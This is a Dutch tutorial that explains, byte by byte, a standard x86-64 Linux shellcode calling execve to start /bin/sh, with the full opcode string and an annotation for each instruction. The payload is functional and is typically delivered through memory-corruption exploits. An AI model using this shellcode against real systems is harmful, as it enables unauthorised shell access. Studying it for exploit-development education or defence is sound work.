
# Shellcode voor het Aanroepen van een System Call Nummer 59 (execve in 64-bit modus)

Deze handleiding beschrijft shellcode die system call nummer 59 (execve) aanroept met drie argumenten: een pointer naar het programma dat we uitvoeren (`/bin/sh`) en twee null bytes (voor `argv` en `envp`).

## Overzicht

In de x86-64 Linux calling convention voor system calls wordt het system call nummer opgeslagen in het `%rax` register en de argumenten worden opgeslagen in de `%rdi`, `%rsi`, `%rdx`, `%r10`, `%r8` en `%r9` registers.

In de onderstaande shellcode zetten we eerst het `%rdx` register op nul (`xor rdx, rdx`) en pushen dit op de stack. Vervolgens wordt de string waarde `"/bin//sh"` opgeslagen in het `%rbx` register en op de stack gepusht.

De stack pointer (opgeslagen in `%rsp`) wijst nu naar de null-terminated string `"/bin//sh"` op de stack. De stack pointer wordt verplaatst naar het `%rdi` register en is het eerste argument voor de call naar de `execve` system call.

Het tweede (`%rsi`) en derde (`%rdx`) argument worden geïnitialiseerd op nul en tenslotte wordt het system call nummer (0x3B) opgeslagen in het `%al` register (de onderste 8 bits van `%rax`). De system call wordt aangeroepen met de "syscall" instructie.

## Shellcode

```assembly
shellcode = "".join([
    "\x48\x31\xd2",                                # xor    rdx, rdx
    "\x52",                                          # push   rdx
    "\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68",    # mov qword rbx, '/bin//sh'
    "\x53",                                          # push   rbx
    "\x48\x89\xe7",                                # mov    rdi, rsp
    "\x48\x89\xd6",                                # mov    rsi, rdx
    "\xb0\x3b",                                     # mov    al, 0x3b
    "\x0f\x05"                                      # syscall
])
```

## Gedetailleerde Uitleg

1. **Initialisatie van `%rdx` op nul:**
    ```assembly
    \x48\x31\xd2    # xor rdx, rdx
    \x52              # push rdx
    ```
    - Deze instructies zetten het `%rdx` register op nul en pushen vervolgens deze nulwaarde op de stack.

2. **Pushing van de string `"/bin//sh"` op de stack:**
    ```assembly
    \x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68    # mov qword rbx, '/bin//sh'
    \x53                                              # push rbx
    ```
    - Deze instructies zetten de string `"/bin//sh"` in het `%rbx` register en pushen het vervolgens op de stack.

3. **Verplaatsing van de stack pointer naar `%rdi`:**
    ```assembly
    \x48\x89\xe7    # mov rdi, rsp
    ```
    - Deze instructie verplaatst de huidige waarde van de stack pointer (`%rsp`), die nu wijst naar de string `"/bin//sh"`, naar het `%rdi` register.

4. **Initialisatie van de overige registers:**
    ```assembly
    \x48\x89\xd6    # mov rsi, rdx
    ```
    - Deze instructie initialiseert het `%rsi` register op nul door de waarde van `%rdx` (die nul is) naar dit register te kopiëren.

5. **Instellen van het system call nummer en aanroepen van de system call:**
    ```assembly
    \xb0\x3b    # mov al, 0x3b
    \x0f\x05    # syscall
    ```
    - Deze instructies zetten het system call nummer (0x3B voor `execve`) in het `%al` register en roepen de system call aan met de "syscall" instructie.

Met deze shellcode wordt de `execve` system call aangeroepen om de shell (`/bin/sh`) te starten met lege argumenten en omgevingsvariabelen.
